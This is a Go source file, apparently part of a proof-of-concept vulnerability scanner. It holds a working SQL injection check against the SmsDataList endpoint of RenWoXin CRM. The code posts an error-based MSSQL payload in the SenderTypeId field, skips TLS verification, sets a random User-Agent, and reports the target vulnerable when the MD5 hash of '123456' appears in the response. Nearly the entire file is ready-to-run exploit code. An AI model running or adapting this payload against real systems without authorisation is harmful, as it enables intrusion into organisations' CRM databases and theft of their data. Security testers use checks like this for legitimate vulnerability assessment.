package poc

import (
	"PocSir/config"
	"bytes"
	"crypto/tls"
	"io"
	"net/http"
	"strings"
	"time"
)

func RenWoXin_Crm_Sql(target string) {
	pocUrl := target + "/SMS/SmsDataList/?pageIndex=1&pageSize=30"
	headers := map[string]string{
		"User-Agent":   getRandUa(),
		"Content-Type": "application/x-www-form-urlencoded",
	}

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}

	client := http.Client{
		Transport: tr,
		Timeout:   10 * time.Second,
	}

	verifyPoc := []byte(`Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0000000000' and 1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456')))) AND 'CvNI'='CvNI`)

	req, err := http.NewRequest("POST", pocUrl, bytes.NewBuffer(verifyPoc))
	if err != nil {
		config.ErrMsg.Printf("[-]Error creating request: %v\n", err)
		return
	}

	for key, value := range headers {
		req.Header.Set(key, value)
	}

	resp, err := client.Do(req)
	if err != nil {
		config.ErrMsg.Printf("[-]%s is timeout\n", target)
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode == http.StatusOK && strings.Contains(string(body), "e10adc3949ba59abbe56e057f20f883e") {
		config.Right.Printf("[+]存在任我行 CRM SmsDataList SQL注入漏洞\n")
		config.TextPut.Printf(string(body) + "\n")
	} else {
		config.ErrMsg.Printf("[-]不存在任我行 CRM SmsDataList SQL注入漏洞\n")
		config.TextPut.Printf(string(body) + "\n")
	}
}
